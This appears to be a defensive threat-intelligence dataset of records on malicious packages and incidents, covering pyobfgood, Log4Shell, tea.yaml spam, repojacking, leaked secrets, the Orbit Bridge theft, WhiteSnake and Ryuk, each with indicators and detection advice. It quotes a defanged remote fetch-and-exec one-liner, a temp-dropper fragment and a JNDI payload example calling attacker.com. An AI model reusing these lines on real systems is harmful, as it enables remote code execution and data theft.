package_info.why_malicious: The package 'pyobfgood' impersonates a legitimate Python obfuscation tool but contains malicious code in both setup.py and __init__.py. Upon installation, it fetches and executes a remote payload (BlazeStealer) that establishes a Discord bot, granting attackers persistent remote access to the victim's system. This enables data exfiltration, surveillance (including webcam and microphone access), system sabotage, and ransomware-like activities, all without user consent.

malicious_snippets.code_snippet: import urllib.request; exec(urllib.request.urlopen('hxxps[:]//transfer[.]sh/get/wDK3Q8WOA9/start[.]py').read())
malicious_snippets.code_behavior: During package installation, the code imports urllib.request and fetches a remote Python script from transfer.sh, then executes the downloaded code in the local environment, resulting in arbitrary code execution on the victim's machine.

malice_analysis.why_suspicious: Fetching and executing remote code during installation is a well-known malware tactic, allowing attackers to deliver and update payloads after package publication and evade static analysis.
malice_analysis.violated_expectations: Legitimate Python packages should not execute remote code during installation; setup.py and __init__.py are expected to handle only package setup and initialization logic.
malice_analysis.similar_legitimate_use: Some legitimate bootstrap scripts may fetch dependencies, but they do not execute arbitrary remote code without user consent or verification.
key_indicators: Remote code execution triggered by package installation
Obfuscated or non-standard URLs in setup.py or __init__.py
No user notification or consent for code execution

package_info.why_malicious: The package contains a critical remote code execution vulnerability (CVE-2021-44228, 'Log4Shell'). This can lead to full system compromise, data theft, and further exploitation.

malice_analysis.violated_expectations: Logging frameworks are expected to safely record and store log messages without executing code or initiating network lookups based on log content. This code violates that expectation by allowing log data to control code execution and network activity.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate in enterprise Java for internal resource discovery (e.g., database connections), but not when triggered by untrusted log message content. In this context, using JNDI for log message processing is unsafe and not a standard practice.

package_info.why_malicious: These packages are classified as Potentially Unwanted Applications (PUAs/PUPs) because they are mass-published, lack meaningful or functional code, and are designed to register with the 'tea' protocol for the purpose of artificially inflating the publisher's reputation or rewards. Their presence pollutes the npm ecosystem, creates confusion for users, and may be leveraged for future abuse or manipulation of third-party reward systems.

project: 0x1234567890abcdef
url: https://tea.xyz/what-is-this-file
address: 0xabcdef1234567890
malicious_snippets.code_behavior: At package publish-time, the package statically includes a 'tea.yaml' file in the root directory, which contains a project identifier, a URL to the tea protocol FAQ, and a blockchain address; this data is used to register the package with the tea protocol, resulting in the package being indexed for potential rewards or reputation gain.

malice_analysis.why_suspicious: The inclusion of a non-functional 'tea.yaml' configuration file in thousands of packages, all with similar structure and intent, is suspicious because it serves no purpose for the end user or the package's functionality. Instead, it is used to game a third-party reward system by registering each package with a unique or semi-unique blockchain address.
malice_analysis.violated_expectations: Normal npm packages include configuration files that are directly relevant to the package's functionality or build process. In this case, the 'tea.yaml' file is present solely to manipulate an external protocol's reputation or reward system, not to support any legitimate package function.
malice_analysis.similar_legitimate_use: A legitimate use would be a single, well-maintained package transparently registering itself with a rewards protocol for accountability or transparency, rather than mass-publishing non-functional packages for the sole purpose of reward manipulation.
key_indicators: Presence of 'tea.yaml' in the package root with 'project', 'url', and 'address' fields
No functional code or meaningful package content beyond the static configuration file
Bulk publication of packages with similar naming patterns and identical or near-identical 'tea.yaml' structure
Blockchain addresses embedded in configuration files across many packages

attack_chain.action: Packages are indexed by npm and potentially by the tea protocol, increasing the developer's visibility and possible token rewards.

detection_knowledge.how_to_detect: Automated systems should monitor for npm packages that include a 'tea.yaml' file in the root directory, especially when such packages are published in bulk or exhibit patterned naming conventions. package_info.why_malicious: Repojacking is a supply chain attack technique that exploits a race condition in GitHub’s repository creation and username renaming processes. Attackers can hijack previously trusted repository namespaces, allowing them to upload malicious code under names that are referenced by existing dependencies or workflows, thereby poisoning the software supply chain.

required_permissions: GitHub account with ability to create repositories

malicious_snippets.code_behavior: During a race condition between repository creation and username renaming, the code issues a repository creation request for the target repository name, then almost simultaneously requests a username change to the victim’s old username, resulting in the attacker claiming a previously protected namespace and enabling upload of malicious code under a trusted name.

malice_analysis.why_suspicious: This sequence is suspicious because it deliberately exploits a timing flaw in GitHub’s namespace protection, allowing an attacker to bypass intended safeguards and hijack trusted repository names for malicious purposes.
malice_analysis.violated_expectations: Normal users do not attempt to create a repository and rename their username in a coordinated, near-simultaneous manner specifically targeting a retired or protected namespace. Legitimate actions would not involve exploiting timing windows to bypass namespace retirement protections.
malice_analysis.similar_legitimate_use: Legitimate users may independently rename usernames or create repositories, but do not automate or script these actions to occur in a tightly coordinated fashion targeting protected namespaces.

malice_analysis.why_suspicious: Hardcoding plaintext secrets in source code or configuration files that are published publicly exposes sensitive credentials to anyone, enabling unauthorized access to cloud services, APIs, or internal systems.
malice_analysis.violated_expectations: Best practices dictate that secrets should be injected at runtime using environment variables or secret management tools, never hardcoded in files that may be committed to version control or published. Hardcoding secrets violates secure development standards.
malice_analysis.similar_legitimate_use: Occasionally, developers may hardcode test or dummy credentials in private, internal-only repositories for development or testing purposes, but this is strongly discouraged and should never occur in public or production code.
key_indicators: High-entropy strings matching known API key or secret patterns (e.g., AWS, GCP, Telegram, etc.) in source or config files
Variable names or keys such as 'API_KEY', 'SECRET_KEY', 'TOKEN', 'PASSWORD' assigned to string literals
Secrets present in plaintext within files commonly used for configuration (.env, settings.py, config.js, credentials.json, Dockerfile, etc.)
Secrets committed to public version control systems or published in package registries

attack_chain.action: Developer accidentally commits plaintext API tokens or secrets to source code or configuration files.
attack_chain.leads_to: Secrets are published to public package registries or repositories, making them accessible to anyone.

attack_chain.action: Malicious actors or automated scanners search public registries and repositories for exposed secrets using pattern-matching or entropy analysis.
attack_chain.leads_to: Attackers obtain valid credentials for cloud services, APIs, or internal systems.

attack_chain.action: Attackers use the exposed secrets to access confidential data, infrastructure, or perform further attacks such as privilege escalation, data exfiltration, or service abuse.
attack_chain.leads_to: Potential data breach, service abuse, or supply chain compromise.

behavioral_signatures: Presence of high-entropy strings matching known API key or secret formats in source code or configuration files
Secrets or credentials committed to public repositories or published in package registries
Static credentials found in files such as .env, config.js, settings.py, Dockerfile, or credentials.json
Variable assignments with names like 'API_KEY', 'SECRET_KEY', 'TOKEN', 'PASSWORD' containing string literals
file_indicators: .env
config.js
settings.py
Dockerfile
credentials.json
Any source or configuration file containing patterns such as 'API_KEY', 'SECRET_KEY', 'TOKEN', 'PASSWORD', etc.
network_indicators: Unusual or unauthorized access to cloud APIs (e.g., AWS, GCP, Telegram) from unknown or suspicious IP addresses
Sudden spikes in API usage or failed authentication attempts following a new package release or code commit
Access attempts to cloud services using credentials that were recently exposed in public code
detection_knowledge.how_to_detect: Implement automated scanning of source code and package artifacts for high-entropy strings and patterns matching known API key or secret formats before code is committed or published. Monitor public repositories and registries for accidental credential exposure using secrets detection tools (e.g., JFrog Advanced Security, TruffleHog, GitGuardian). Set up alerts for commits or releases containing secrets. Monitor cloud provider logs for unauthorized or anomalous access patterns, such as logins from unusual IPs or usage spikes, that may indicate use of exposed credentials.

package_info.why_malicious: The Orbit Bridge protocol was compromised, resulting in unauthorized access to the Ethereum L1 Vault smart contract. The attacker exploited privileged credentials—likely via private key compromise or phishing—to initiate unauthorized, high-value asset transfers, leading to the theft of approximately $81 million in DAI, USDC, USDT, ETH, and WBTC. This incident demonstrates a critical breakdown in key management and access controls at the protocol level.

execution_context.trigger: On-chain transaction execution (when a privileged transaction is submitted to the Ethereum L1 Vault contract)
execution_context.file_location: Ethereum L1 Vault smart contract (Orbit Bridge protocol, on-chain address)
required_permissions: Admin privileges on the smart contract
Authority to initiate asset transfers from the vault

malicious_snippets.code_snippet: N/A (malicious activity was performed via on-chain transactions using compromised admin credentials; no new or modified contract code was deployed, but existing contract functions were abused to transfer assets)
malicious_snippets.code_language: Solidity (Ethereum smart contract interaction via transaction calls)
malicious_snippets.code_behavior: At on-chain transaction execution, the attacker submits privileged asset transfer transactions to the Ethereum L1 Vault smart contract, invoking transfer functions to move DAI, USDC, USDT, ETH, and WBTC from the vault to attacker-controlled addresses, resulting in the unauthorized exfiltration of $81 million in assets.

malice_analysis.why_suspicious: A series of large, unscheduled asset transfers from the protocol's vault to external addresses occurred without any corresponding legitimate bridge activity, all authorized by privileged admin credentials. Such behavior is highly anomalous and indicative of a security breach.
malice_analysis.violated_expectations: Under normal operation, asset transfers from the vault are strictly controlled and only occur as part of validated bridge transactions initiated by users. In this incident, transfers were executed directly by an admin key, bypassing standard authorization and validation processes.
malice_analysis.similar_legitimate_use: Legitimate bridge operations may transfer assets between chains or to users as part of normal withdrawals, but only after passing multi-signature checks, user-initiated requests, and protocol-defined validation steps. Direct admin-initiated transfers without these checks are not expected.
key_indicators: Unscheduled, high-value asset transfers from the vault contract
Transactions authorized by privileged/admin keys outside of normal operational windows
No corresponding user-initiated bridge activity or withdrawal requests
Transfers to new or previously unseen external wallet addresses
Rapid, sequential draining of multiple asset types

attack_chain.action: Attacker obtains access to privileged credentials for the Orbit Bridge Ethereum L1 Vault (likely via phishing or private key compromise).
attack_chain.leads_to: Ability to submit privileged transactions to the smart contract.

attack_chain.action: Attacker uses compromised admin credentials to execute asset transfer transactions from the Orbit Bridge Ethereum L1 Vault smart contract.
attack_chain.leads_to: Funds are transferred from the vault to attacker-controlled wallet addresses.

attack_chain.action: Attacker rapidly moves stolen assets to exchanges or mixing services to launder and obfuscate the origin of the funds.
attack_chain.leads_to: Final goal: theft and obfuscation of stolen assets.

behavioral_signatures: Unscheduled, high-value asset transfers from protocol vault smart contracts
Transactions signed by privileged/admin keys outside of normal operational windows or without corresponding bridge activity
No matching user-initiated bridge requests for large withdrawals
Rapid, sequential transfers of multiple asset types to external addresses
file_indicators: N/A (on-chain protocol; detection relies on monitoring smart contract event logs for abnormal transfer events from the vault contract address)
network_indicators: Large outbound transfers to new or previously unseen wallet addresses
Rapid movement of assets to cryptocurrency exchanges or mixing services following the initial theft
detection_knowledge.how_to_detect: Continuously monitor smart contract event logs for unscheduled, high-value asset transfers from protocol vault addresses, especially those authorized by admin or privileged keys. Correlate these events with bridge operation logs to identify transfers not associated with legitimate user-initiated bridge activity. Set up real-time alerts for large withdrawals to new or untrusted addresses, and track rapid movement of assets to exchanges or mixers immediately following suspicious transfers.

package_info.package_name: WhiteSnake Malware (multiple packages, e.g., testepassword-generate, cc-checkerx, ja3-hashscript, etc.)
package_info.why_malicious: These packages contain base64-encoded, OS-specific malicious payloads in setup.py that execute on installation, exfiltrate sensitive data (including crypto wallets, browser data, and system information), and maintain persistence and remote access. The malware employs obfuscation, anti-analysis, and multi-stage exfiltration via file-sharing services and Telegram, targeting both Windows and Linux systems. The attack chain includes dropping and executing binaries, creating scheduled tasks, establishing reverse SSH tunnels, and automated data theft and exfiltration.

malicious_snippets.code_behavior: During package installation, the code checks the operating system and executes a base64-encoded, OS-specific payload using exec(), enabling further malicious actions such as binary dropping or data theft.

malice_analysis.why_suspicious: Embedding and executing base64-encoded payloads in setup.py is a common obfuscation technique to hide malicious code and evade static analysis. Executing arbitrary code at install time is highly abnormal and a strong indicator of malicious intent.
malice_analysis.violated_expectations: setup.py should only define package installation logic and dependencies, not execute hidden, encoded payloads that perform system-level actions.
malice_analysis.similar_legitimate_use: Base64 encoding is sometimes used for data transport or configuration, but not for hiding and executing code in setup.py during installation.
key_indicators: Base64-encoded payload in setup.py
exec() on decoded data
OS-specific branching (Windows vs Linux)
Triggers on install (postinstall execution)

import os as o
import tempfile as t
p=o.path.join(t.gettempdir(),'e8d74164335ac04bb4abef4671e98ef.exe')

malicious_snippets.code_behavior: At postinstall on Windows, the code writes a malicious PE executable to a randomized temp directory and executes it, initiating persistence mechanisms and enabling subsequent data theft.

malice_analysis.why_suspicious: Writing and executing a binary during package installation is highly abnormal and a strong indicator of malware, especially when the binary is hidden in a temp directory.
malice_analysis.violated_expectations: Legitimate packages do not drop and execute hidden binaries in temp directories as part of installation.
malice_analysis.similar_legitimate_use: Rarely, legitimate installers may unpack dependencies, but not in an obfuscated or hidden manner, nor do they execute unknown binaries without user consent.
key_indicators: Writes PE executable to temp directory
Executes dropped binary via startfile()
Randomized file name for binary
Binary content starts with 'MZ' (PE header)

malicious_snippets.code_snippet: Creates a scheduled task to run the dropped executable at fixed intervals.
malicious_snippets.code_behavior: After installation on Windows, the code creates a scheduled task that repeatedly executes the malicious binary from the temp directory, maintaining persistence on the system.

malice_analysis.why_suspicious: Malware commonly uses scheduled tasks to maintain persistence and ensure continued execution after reboots.
malice_analysis.violated_expectations: Legitimate packages do not create scheduled tasks for hidden or dropped binaries without explicit user action.
malice_analysis.similar_legitimate_use: Scheduled tasks are used by legitimate software for updates or maintenance, but not for executing hidden binaries installed without user knowledge.
key_indicators: Scheduled task creation for dropped binary
Persistence mechanism via Windows Task Scheduler
Hidden execution of temp directory binaries

malicious_snippets.code_behavior: At postinstall on Windows, the code downloads a legitimate OpenSSH binary and uses it to establish a reverse SSH tunnel to serveo.net, enabling remote attacker access to the victim system.

malice_analysis.why_suspicious: Downloading and running remote access tools such as OpenSSH to establish external tunnels is a classic command-and-control (C2) tactic used by malware.
malice_analysis.violated_expectations: There is no legitimate reason for a package to establish external SSH tunnels to third-party services during installation.
malice_analysis.similar_legitimate_use: OpenSSH is used legitimately for secure remote access, but not as a hidden payload in package installation scripts.
key_indicators: OpenSSH binary download and execution
Connection to serveo.net for port forwarding
Reverse SSH tunnel establishment

malice_analysis.why_suspicious: Uploading encrypted archives to attacker-controlled servers is a hallmark of data exfiltration in malware campaigns.
malice_analysis.violated_expectations: Legitimate packages do not compress and exfiltrate user data to remote servers without user consent.
malice_analysis.similar_legitimate_use: Compression and upload may be used for legitimate cloud backup, but not with hidden, encrypted archives sent to unknown IPs.

Compression and encryption of user data

malicious_snippets.code_behavior: At postinstall on Linux, the code checks if the operating system is Linux and exits immediately if not, ensuring only targeted systems are affected by subsequent malicious actions.

malice_analysis.why_suspicious: OS targeting is common in advanced malware to avoid detection and maximize impact on intended victims.
malice_analysis.violated_expectations: Legitimate code is usually cross-platform or fails gracefully, not with abrupt exits based on OS checks.
malice_analysis.similar_legitimate_use: OS checks are used for compatibility, but not to restrict execution for malicious targeting.

package_info.why_malicious: Ryuk ransomware is a highly destructive malware family designed to encrypt files on compromised systems and extort victims for large ransom payments. It is typically deployed as the final payload in multi-stage attacks, following initial access via Trickbot or Emotet, and is responsible for severe operational disruption, data loss, and financial extortion through targeted attacks on organizations.

execution_context.trigger: runtime (post-compromise, upon manual or automated execution of the Ryuk binary)
execution_context.file_location: Ryuk ransomware binary (commonly dropped in %TEMP% or user profile directories on Windows systems)
required_permissions: filesystem (read/write/delete access to user and system files)
network (for potential lateral movement or reporting)
process control (to enumerate and interact with running processes)
privilege escalation (to access protected files and terminate critical processes)

malicious_snippets.code_behavior: At runtime, the code enumerates files on local and network drives, encrypts each file not on a whitelist using AES-256 encryption, appends a ransomware-specific extension (.RYK or .RYUK), deletes the original file, and renders the data inaccessible to the user.

malice_analysis.why_suspicious: The code performs mass file encryption and deletion, which is a definitive indicator of ransomware activity and results in immediate data loss.
malice_analysis.violated_expectations: Legitimate software does not encrypt user or system files in bulk without explicit user consent, nor does it delete originals after encryption.
malice_analysis.similar_legitimate_use: Backup or secure file storage tools may encrypt files, but only with user knowledge, and typically retain the original files or provide a clear recovery path.
key_indicators: Bulk file enumeration and encryption using strong cryptography (AES-256)
Addition of .RYK or .RYUK extensions to encrypted files
Deletion of original files post-encryption
Targeting both local and network drives

execution_context.file_location: Ryuk ransomware binary (same as above, typically in %TEMP% or user profile directories)
required_permissions: network (for potential communication of ransom instructions)

malice_analysis.violated_expectations: Legitimate software never extorts users or demands payment for access to their own files.

malice_analysis.violated_expectations: Normal applications do not indiscriminately terminate critical system, backup, or security processes without explicit user or administrator approval.

package_info.why_malicious: The package contains a critical vulnerability (CVE-2021-44228, 'Log4Shell') that allows remote code execution via crafted log messages. Attackers can inject specially crafted JNDI lookup patterns into log messages, causing the application to fetch and execute code from attacker-controlled servers. While not intentionally malicious, the vulnerability enables severe exploitation and is treated as a critical security risk.

malicious_snippets.code_behavior: At log message processing, the code receives user-controlled input in log messages, passes it to the JNDI lookup mechanism, initiates a network request to a remote server specified in the input, and loads and executes remote code, resulting in remote code execution.

malice_analysis.why_suspicious: The code allows untrusted user input in log messages to be directly evaluated as a JNDI lookup, which can result in the application making network requests to attacker-controlled servers and loading remote code.
malice_analysis.violated_expectations: Logging frameworks are expected to treat log message content as inert data, not as executable expressions that can trigger network requests or code execution. Here, user input in log messages can cause the application to execute arbitrary code.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate for internal resource discovery in trusted environments, but exposing this functionality to untrusted log message content is unsafe and not a standard practice.
key_indicators: User-controlled log message content passed to JNDI lookup
JndiLookup class present and accessible in log4j-core
Network requests initiated during log processing based on log message content
Potential for remote code execution via JNDI injection in log messages

attack_chain.action: Attacker sends a crafted log message containing a JNDI URI (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.
attack_chain.leads_to: Log4j processes the log message and triggers a JNDI lookup.

attack_chain.action: The JNDI lookup mechanism in Log4j makes a network request to the attacker-controlled server specified in the URI.
attack_chain.leads_to: Remote code is loaded and executed on the victim system.

attack_chain.action: Attacker gains remote code execution privileges on the vulnerable system.
attack_chain.leads_to: Final goal: full system compromise.

behavioral_signatures: Log message content containing ${jndi:...} patterns
Unexpected outbound LDAP, RMI, or other JNDI-related network requests from Java applications during log processing
Execution of code loaded from remote servers as a result of log message handling
file_indicators: Presence of org/apache/logging/log4j/core/lookup/JndiLookup.class in application files
log4j-core versions 2.0-beta9 to 2.14.1 listed in application dependencies
network_indicators: Outbound LDAP, RMI, or HTTP requests to external or untrusted domains during log processing
Connections to attacker-controlled infrastructure immediately following log events containing suspicious patterns
detection_knowledge.how_to_detect: Scan application dependencies for vulnerable log4j-core versions (2.0-beta9 to 2.14.1). Monitor logs for the presence of ${jndi:...} patterns in log messages. Analyze network traffic for unexpected outbound LDAP, RMI, or HTTP requests originating from Java applications during log processing. Use static analysis to detect use of JndiLookup in code paths that process user-controlled input.
